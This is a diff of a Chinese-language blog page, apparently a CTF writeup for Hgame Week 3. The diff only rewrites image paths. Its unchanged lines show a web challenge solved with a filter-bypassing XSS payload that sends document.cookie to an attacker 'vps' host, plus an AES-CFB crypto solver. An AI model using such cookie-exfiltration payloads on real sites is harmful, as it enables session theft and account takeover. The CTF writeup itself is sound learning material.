@@ -93,7 +93,7 @@
         </div>
 
     <h3 id="hgame-week3-writeup">Hgame Week3 Writeup</h3>
-<p><img src="media/15792383134168/logo.png" alt="logo"></p>
+<p><img src="/media/15792383134168/logo.png" alt="logo"></p>
 <p>这周不怎么想做题Orz，咕咕咕</p>
 <h4 id="0x00-web">0x00 Web</h4>
 <h5 id="cosmos的聊天室20">Cosmos的聊天室2.0</h5>
@@ -118,9 +118,9 @@
 再把他urlencode一下生成最终的payload。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">object</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span> <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/send?message=%3Cscscscriptriptript%3Efetch%28%27http%3A//vps/%3F%27%2Bdocument.cookie%29%3C/scscscriptriptript%3E&#34;</span>&gt;&lt;/<span style="color:#f92672">object</span>&gt;
 </code></pre></div><p>提交，成功拿到cookie。。
-<img src="media/15804580147047/Screen%20Shot%202020-02-01%20at%208.29.59%20PM.png" alt="Screen Shot 2020-02-01 at 8.29.59 P-w940">
+<img src="/media/15804580147047/Screen%20Shot%202020-02-01%20at%208.29.59%20PM.png" alt="Screen Shot 2020-02-01 at 8.29.59 P-w940">
 Burp提交上去。。
-<img src="media/15804580147047/Screen%20Shot%202020-02-01%20at%208.30.39%20PM.png" alt="Screen Shot 2020-02-01 at 8.30.39 P-w1012">
+<img src="/media/15804580147047/Screen%20Shot%202020-02-01%20at%208.30.39%20PM.png" alt="Screen Shot 2020-02-01 at 8.30.39 P-w1012">
 拿到flag。。（这周脑子坏了）</p>
 <h4 id="0x01-reverse">0x01 Reverse</h4>
 <h4 id="0x02-pwn">0x02 Pwn</h4>
@@ -130,8 +130,8 @@ Burp提交上去。。
 <h5 id="exchange">Exchange</h5>
 <h5 id="feedback">Feedback</h5>
 <p>这题不难但是有点繁琐。。首先要知道CFB的工作模式
-<img src="media/15804580147047/1202px-CFB_encryption.svg.png" alt="1202px-CFB_encryption.svg-w601">
-<img src="media/15804580147047/1202px-CFB_decryption.svg.png" alt="1202px-CFB_decryption.svg-w601">
+<img src="/media/15804580147047/1202px-CFB_encryption.svg.png" alt="1202px-CFB_encryption.svg-w601">
+<img src="/media/15804580147047/1202px-CFB_decryption.svg.png" alt="1202px-CFB_decryption.svg-w601">
 所以这题我们虽然不能直接得到KEY和IV，但可以根据输入与输出的反馈，不断的求出每一次ciphertext和AES(KEY)加密后的结果（shift register）来与下一次的数据异或来求出每一段的原文（好绕啊，我自己都绕了好久。。）
 首先一次性是不可能拿到全flag的，只能拿到1/3个（16字节），至少要nc三次才能拿全。。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> os
@@ -201,8 +201,8 @@ flag_3 <span style="color:#f92672">=</span> xor(cipherblock_c2, flag_enc_3) <spa
 flag <span style="color:#f92672">=</span> flag_1 <span style="color:#f92672">+</span> flag_2 <span style="color:#f92672">+</span>flag_3
 <span style="color:#66d9ef">print</span>(flag)
 </code></pre></div><p>我的试验脚本（有点乱，不管了），已经知道了前两段的flag，这是求第三段的。
-<img src="media/15804580147047/Screen%20Shot%202020-01-31%20at%208.11.42%20PM.png" alt="Screen Shot 2020-01-31 at 8.11.42 P-w920">
-<img src="media/15804580147047/Screen%20Shot%202020-01-31%20at%208.11.32%20PM.png" alt="Screen Shot 2020-01-31 at 8.11.32 P-w566">
+<img src="/media/15804580147047/Screen%20Shot%202020-01-31%20at%208.11.42%20PM.png" alt="Screen Shot 2020-01-31 at 8.11.42 P-w920">
+<img src="/media/15804580147047/Screen%20Shot%202020-01-31%20at%208.11.32%20PM.png" alt="Screen Shot 2020-01-31 at 8.11.32 P-w566">
 拿到flag</p>
 <h4 id="0x04-misc">0x04 Misc</h4>
 
